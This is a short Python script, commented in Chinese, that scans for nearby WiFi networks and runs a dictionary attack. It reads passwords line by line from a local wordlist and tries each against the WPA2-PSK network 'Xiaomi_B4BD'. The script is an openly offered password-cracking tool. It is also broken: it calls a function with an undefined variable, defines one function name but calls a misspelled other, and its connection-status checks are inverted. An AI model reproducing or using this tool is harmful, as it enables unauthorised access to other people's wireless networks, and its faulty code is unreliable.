import pywifi
from pywifi import const
import time

# 1.导入模块
# 2.抓取网卡接口
# 3.断开所有的WiFi
# 4.读取密码本
# 5.测试连接
# 6.设置睡眠时间



#扫描附近的wifi
def bies () :
    wifi=pywifi.PyWiFi ()
    ifaces=wifi.interfaces () [0]
    #扫描wifi
    ifaces.scan()
    #获取扫描结果
    result=ifaces.scan_results ()
    for name in result :
        print (name.ssid)

bies ()



#测试连接，返回连接接结果
def wificonnect (pwd) :
    #抓取网卡接口
    wifi=pywifi.PyWiFi ()
    #获取第一个无线网卡
    ifaces=wifi.interfaces () [0]
    #断开所有连接
    ifaces.disconnect ()
    time.sleep (1)
    wifistatus=ifaces.status ()
    #const.IFACE_DISCONNECTED
    print (const.IFACE_DISCONNECTED)
    if ifaces.status ()==const.IFACE_CONNECTED :
        #print ("未连接")
        #创建WiFi连接文件
        profile=pywifi.Profile ()
        #要连接WiFi的名称
        profile.ssid="Xiaomi_B4BD"
        #网卡的开放
        profile.auth=const.AUTH_ALG_OPEN
        #WiFi加密算法
        profile.akm.append (const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #密码
        profile.key=pwd
        #删除所有的WiFi文件
        ifaces.remove_all_network_profiles ()
        #设定新的连接文件
        tep_profile=ifaces.add_network_profile (profile)
        ifaces.connect (tep_profile)
        #WiFi连接的时间

        if ifaces.status ()==const.IFACE_CONNECTED :
            return True
        else :
            return False
    else :
        print ("已连接")

wificonnect (pwd)


#读取密码本
def readPsssword () :
    print ("开始破解")
    #读取密码本的路径
    path="C:\\Users\Administrator\Desktop\passwords.txt"
    #打开文件 读
    file=open (path,"r")
    while True :
        #读取文件出现错误
        try :
            #readlin 读取一行
            passStr=file.readline ()
            bool=wificonnect (passStr)
            if bool :
                print ("密码正确",passStr)
                #跳出当前循环
                break
            else :
                print ("密码不正确",passStr)
        except :
            #跳出当前循环，执行下一循环
            continue

readPassword ()

